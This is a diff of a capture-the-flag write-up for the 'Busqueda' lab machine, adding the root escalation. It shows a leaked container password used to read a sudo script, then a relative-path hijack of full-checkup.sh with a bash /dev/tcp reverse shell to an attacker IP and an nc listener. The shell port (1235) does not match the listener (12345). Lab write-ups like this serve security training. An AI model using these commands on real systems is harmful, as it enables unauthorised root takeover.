@@ -246,7 +246,7 @@ User svc may run the following commands on busqueda:
     (root) /usr/bin/python3 /opt/scripts/system-checkup.py *
 ```
 
-Trying to run the script since we can't read the content:
+The script is not readable but the usage is displayed when executed, we can specify one of the available actions as well as arguments:
 ```
 svc@busqueda:/opt/scripts$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py id
 < /usr/bin/python3 /opt/scripts/system-checkup.py id
@@ -257,11 +257,153 @@ Usage: /opt/scripts/system-checkup.py <action> (arg1) (arg2)
      full-checkup  : Run a full system checkup
 ```
 
-The script usage is displayed, we can specify one of the available, but also arguments:
+Testing the various actions:
 ```
-svc@busqueda:/opt/scripts$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-ps
-<in/python3 /opt/scripts/system-checkup.py docker-ps
+svc@busqueda:/var/www/app/.git$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-ps
+
 CONTAINER ID   IMAGE                COMMAND                  CREATED        STATUS       PORTS                                             NAMES
-960873171e2e   gitea/gitea:latest   "/usr/bin/entrypoint…"   4 months ago   Up 2 hours   127.0.0.1:3000->3000/tcp, 127.0.0.1:222->22/tcp   gitea
-f84a6b33fb5a   mysql:8              "docker-entrypoint.s…"   4 months ago   Up 2 hours   127.0.0.1:3306->3306/tcp, 33060/tcp               mysql_db
+960873171e2e   gitea/gitea:latest   "/usr/bin/entrypoint…"   4 months ago   Up 4 hours   127.0.0.1:3000->3000/tcp, 127.0.0.1:222->22/tcp   gitea
+f84a6b33fb5a   mysql:8              "docker-entrypoint.s…"   4 months ago   Up 4 hours   127.0.0.1:3306->3306/tcp, 33060/tcp               mysql_db
+
+svc@busqueda:/opt/scripts$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect
+
+Usage: /opt/scripts/system-checkup.py docker-inspect <format> <container_name>
+
+svc@busqueda:/var/www/app/.git$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py full-checkup
+
+Something went wrong
+```
+
+The first options lists the current state of the containers.
+
+The third option failed without any verbose output.
+
+Checking the documentation for the docker-inspect option:
+https://docs.docker.com/engine/reference/commandline/inspect/
+
+We are able to dump the configuration data of the container, which contains clear text credentials:
+```
+svc@busqueda:/opt/scripts$ sudo /usr/bin/python3 /opt/scripts/system-checkup.py docker-inspect '{{json .Config}}' gitea
+<-checkup.py docker-inspect '{{json .Config}}' gitea
+{"Hostname":"960873171e2e","Domainname":"","User":"","AttachStdin":false,"AttachStdout":false,"AttachStderr":false,"ExposedPorts":{"22/tcp":{},"3000/tcp":{}},"Tty":false,"OpenStdin":false,"StdinOnce":false,"Env":["USER_UID=115","USER_GID=121","GITEA__database__DB_TYPE=mysql","GITEA__database__HOST=db:3306","GITEA__database__NAME=gitea","GITEA__database__USER=gitea","GITEA__database__PASSWD=yuiu1hoiu4i5ho1uh","PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin","USER=git","GITEA_CUSTOM=/data/gitea"],"Cmd":["/bin/s6-svscan","/etc/s6"],"Image":"gitea/gitea:latest","Volumes":{"/data":{},"/etc/localtime":{},"/etc/timezone":{}},"WorkingDir":"","Entrypoint":["/usr/bin/entrypoint"],"OnBuild":null,"Labels":{"com.docker.compose.config-hash":"e9e6ff8e594f3a8c77b688e35f3fe9163fe99c66597b19bdd03f9256d630f515","com.docker.compose.container-number":"1","com.docker.compose.oneoff":"False","com.docker.compose.project":"docker","com.docker.compose.project.config_files":"docker-compose.yml","com.docker.compose.project.working_dir":"/root/scripts/docker","com.docker.compose.service":"server","com.docker.compose.version":"1.29.2","maintainer":"maintainers@gitea.io","org.opencontainers.image.created":"2022-11-24T13:22:00Z","org.opencontainers.image.revision":"9bccc60cf51f3b4070f5506b042a3d9a1442c73d","org.opencontainers.image.source":"https://github.com/go-gitea/gitea.git","org.opencontainers.image.url":"https://github.com/go-gitea/gitea"}}
+```
+
+We are able to login as administrator on Gitea with the leaked password (yuiu1hoiu4i5ho1uh). We now have visibiliy on specific commits regarding the administrative scripts located in /opt/scripts.
+
+The content of the system-checkup.py is viewable:
+```python
+import subprocess
+import sys
+
+actions = ['full-checkup', 'docker-ps','docker-inspect']
+
+def run_command(arg_list):
+    r = subprocess.run(arg_list, capture_output=True)
+    if r.stderr:
+        output = r.stderr.decode()
+    else:
+        output = r.stdout.decode()
+
+    return output
+
+
+def process_action(action):
+    if action == 'docker-inspect':
+        try:
+            _format = sys.argv[2]
+            if len(_format) == 0:
+                print(f"Format can't be empty")
+                exit(1)
+            container = sys.argv[3]
+            arg_list = ['docker', 'inspect', '--format', _format, container]
+            print(run_command(arg_list)) 
+        
+        except IndexError:
+            print(f"Usage: {sys.argv[0]} docker-inspect <format> <container_name>")
+            exit(1)
+    
+        except Exception as e:
+            print('Something went wrong')
+            exit(1)
+    
+    elif action == 'docker-ps':
+        try:
+            arg_list = ['docker', 'ps']
+            print(run_command(arg_list)) 
+        
+        except:
+            print('Something went wrong')
+            exit(1)
+
+    elif action == 'full-checkup':
+        try:
+            arg_list = ['./full-checkup.sh']
+            print(run_command(arg_list))
+            print('[+] Done!')
+        except:
+            print('Something went wrong')
+            exit(1)
+            
+
+if __name__ == '__main__':
+
+    try:
+        action = sys.argv[1]
+        if action in actions:
+            process_action(action)
+        else:
+            raise IndexError
+
+    except IndexError:
+        print(f'Usage: {sys.argv[0]} <action> (arg1) (arg2)')
+        print('')
+        print('     docker-ps     : List running docker containers')
+        print('     docker-inspect : Inpect a certain docker container')
+        print('     full-checkup  : Run a full system checkup')
+        print('')
+        exit(1)
+```
+
+The first two options will launch native docker commands built from an argument list.
+
+The third option is failing since it is trying to launch the full-checkup.sh script in the current directory while the actual file is stored in /opt/scripts. 
+
+It means that we can craft a malicious reverse shell script and execute it instead of the legitimate one:
+
+```
+vim full-checkup.sh
+
+#!/bin/bash
+/bin/bash -l > /dev/tcp/10.10.14.44/1235 0<&1 2>&1
+
+chmod +x full-checkup.sh
+```
+
+Starting the listener on the attacker machine:
+
+```
+nc -nlvp 12345
+```
+
+The malicious bash script is executed as root:
+
+```
+connect to [10.10.14.44] from (UNKNOWN) [10.10.11.208] 45454
+whoami
+root
+
+hostname
+busqueda
+
+cd /root
+
+ls -l
+total 16
+-rw-r----- 1 root root  430 Apr  3 15:13 ecosystem.config.js
+-rw-r----- 1 root root   33 May 25 22:15 root.txt
+drwxr-xr-x 4 root root 4096 Apr  3 16:01 scripts
+drwx------ 3 root root 4096 Mar  1 10:46 snap
+
+cat root.txt
+51e2dc15892e1e05d75ec51f864bf43f
 ```
